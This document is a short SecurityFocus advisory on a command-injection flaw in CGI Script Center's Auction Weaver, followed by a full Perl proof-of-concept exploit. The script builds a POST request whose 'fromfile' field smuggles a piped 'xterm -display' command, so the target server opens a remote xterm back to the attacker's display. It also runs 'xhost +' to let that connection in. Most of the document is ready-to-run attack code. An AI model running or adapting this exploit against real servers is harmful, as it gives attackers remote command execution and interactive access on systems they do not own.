source: http://www.securityfocus.com/bid/1645/info

CGI Script Center's Auction Weaver does not verify the validity of the value in the variable 'fromfile'. Therefore it is possible to perform arbitrary commands on a remote system under the UID of the http daemon by altering the variable 'fromfile'.


#!/usr/bin/perl -w

## Auction Weaver 1.02 / Only confirmed with LITE
##        -  Proof of Concept exploit -
##
## CGI Script Center have just released an update
## of Auction Weaver due to security reasons - I
## suggest that you spend some more time securing
## it, and the other scripts - It is really needed.
##
## This exploit will spawn a xterm from $target
## to $attacker.
##
## This exploit will not work on hosts running
## Auction Weaver on NT, due to the xterm call.
##
## CGI Script Center, please contact me if you need
## help with securing your scripts...
##
## teleh0r@doglover.com / anno 2000
## http://teleh0r.cjb.net

use strict; use Socket;

if (@ARGV < 3) {
print("Usage: $0 <target> <attacker> <dpy>\n");
exit(1);
}

my($target,$attacker,$dpy,$length,$cgicode,
$agent,$sploit,$iaddr,$paddr,$proto);

($target,$attacker,$dpy) = @ARGV;

if ($dpy !~ /\d/) {
print("dpy must be a number, probably 0\n");
exit(1);
}

print("\nRemote host: $target\n");
print("CGI-script: /cgi-bin/awl/auctionweaver.pl\n");
print("Command: xterm -ut -display $attacker:$dpy\n\n");

system("xhost + $target");

$length = 138 + length($attacker.$dpy);

$cgicode =
"flag1=1&fromfile=%7Cxterm+-display+$attacker%3A$dpy%7C&placebid=1&catdir".
"=cat1&username=teleh0r&password=ohbaby&bid=Ihavenomoney&nobiditem=1&sbut".
"ton=BID";

$agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)";

# The path to auctionweaver.pl may of course need to be changed.

$sploit=
"POST /cgi-bin/awl/auctionweaver.pl HTTP/1.0
Connection: close
User-Agent: $agent
Host: $target
Content-type: application/x-www-form-urlencoded
Content-length: $length

$cgicode";

$iaddr = inet_aton($target)                     || die("Error: $!\n");
$paddr = sockaddr_in(80, $iaddr)                || die("Error: $!\n");
$proto = getprotobyname('tcp')                  || die("Error: $!\n");

socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    || die("Error: $!\n");
connect(SOCKET, $paddr)                         || die("Error: $!\n");
send(SOCKET,"$sploit\015\012", 0)               || die("Error: $!\n");
close(SOCKET);

sleep(3);
system("xhost - $target");
print("\nAll done - hopefully you got the flying xterm!\n");
exit(0)
